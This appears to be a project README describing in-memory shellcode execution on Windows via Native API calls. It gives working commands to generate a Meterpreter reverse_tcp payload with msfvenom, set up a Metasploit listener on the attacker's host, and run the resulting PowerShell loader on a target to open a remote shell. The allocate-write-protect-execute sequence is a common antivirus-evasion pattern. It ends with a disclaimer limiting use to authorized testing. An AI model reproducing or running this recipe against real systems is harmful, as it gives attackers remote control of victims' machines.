# NTAPI-Based In-Memory Execution

## Overview
This project demonstrates in-memory code execution using Windows Native API (NTAPI) calls from `ntdll.dll`.

## Prerequisites
- Metasploit Framework (`msfvenom` + `msfconsole`)

## How It Works
1. Allocate memory using native system calls  
2. Write payload into allocated memory  
3. Change memory protection to executable  
4. Execute within the current process  

## Step 1: Generate Shellcode

On the attacker machine:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f ps1
```

This outputs a byte array. Paste it into `rev_shell.ps1` replacing `#YOUR_SHELLCODE_HERE`:
```powershell
[Byte[]] $data = 0xfc,0x48,0x83,0xe4,0xf0,...
```

## Step 2: Start the Listener

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

## Step 3: Run on Target

```powershell
.\rev_shell.ps1
```

> **⚠️ Disclaimer** This project is intended for authorized testing purposes only. Use responsibly and only on systems you have explicit permission to test.
